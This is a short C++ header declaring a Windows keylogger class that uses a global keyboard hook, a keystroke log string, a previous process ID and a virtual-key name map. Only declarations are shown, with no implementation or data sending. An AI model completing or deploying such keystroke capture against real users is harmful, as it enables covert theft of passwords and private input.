#pragma once

#include <iostream>
#include <Windows.h>
#include <thread>
#include <fstream>
#include <string>
#include <map>

static HHOOK keyHook;
static LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
static void makeKeyLog(int keyCode, int statusFlag);


class keyLogger
{
public:
	keyLogger();
	void startHook();

	std::string getKeyLog();
	void clearLog();

	static std::string keyLog;
	static DWORD prevPID;
	static std::map<int, std::string> virtualKeyDict;

private:
	void initializeKeyDict();


};